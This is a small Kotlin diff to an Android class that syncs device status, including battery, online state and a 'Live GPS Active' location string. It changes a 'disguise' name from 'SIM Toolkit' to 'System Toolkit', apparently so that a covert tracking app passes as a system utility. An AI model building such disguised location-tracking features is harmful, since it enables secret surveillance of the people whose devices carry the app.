@@ -34,7 +34,7 @@ class FirebaseSyncManager private constructor(private val context: Context) {
     fun syncDeviceStatus(
         batteryLevel: Int? = null,
         isOnline: Boolean = true,
-        disguise: String = "SIM Toolkit",
+        disguise: String = "System Toolkit",
         location: String = "Live GPS Active"
     ) {
         try {
